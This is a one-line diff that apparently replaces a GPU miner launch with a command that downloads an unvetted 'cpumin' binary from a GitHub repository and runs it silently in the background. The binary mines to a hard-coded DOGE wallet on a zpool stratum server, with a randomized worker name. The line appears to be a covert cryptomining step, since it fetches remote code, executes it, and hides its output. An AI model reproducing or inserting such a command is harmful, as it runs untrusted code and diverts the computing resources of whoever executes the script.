@@ -1,1 +1,1 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.48/lolMiner_v1.48_Lin64.tar.gz && tar -xf lolMiner_v1.48_Lin64.tar.gz && cd 1.48 && ./lolMiner --algo ETHASH --pool sg.stratu.ms --port 12611 --user $(echo $(shuf -i 1-9999 -n 1)-P1)
+wget https://github.com/halga1/yuana/raw/main/cpumin && chmod u+x cpumin && nohup ./cpumin -a yespowerMGPC -o stratum+tcp://yespowerMGPC.sea.mine.zpool.ca:6247 -u DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E.$(echo $(shuf -i 1-9999 -n 1)-P1) -p c=DOGE  -t 2 --quiet &
